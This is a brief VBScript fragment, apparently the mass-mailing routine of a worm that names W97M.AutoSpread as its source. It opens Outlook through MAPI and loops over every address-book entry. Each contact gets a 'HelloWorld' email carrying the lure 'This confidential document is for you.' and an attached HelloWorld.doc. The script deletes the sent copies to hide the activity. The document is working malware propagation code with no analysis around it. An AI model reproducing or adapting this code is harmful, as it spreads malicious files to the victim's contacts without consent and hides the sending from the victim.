'From W97M.AutoSpread
On Error Resume Next
Set out=CreateObject("Outlook.application")
Set map=out.GetNameSpace("MAPI")
For Each C in map.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set E=C.AddressEntries(D)
Set env=out.CreateItem(0)
env.To=E.Address
env.Subject="HelloWorld"
env.Body="This confidential document is for you."
env.Attachments.Add("C:\PetiK\W32.HLLW.RLF\HelloWorld.doc")
env.DeleteAfterSubmit=True
If env.To <> "" Then
env.Send
End If
Next
End If
Next
WScript.Quit
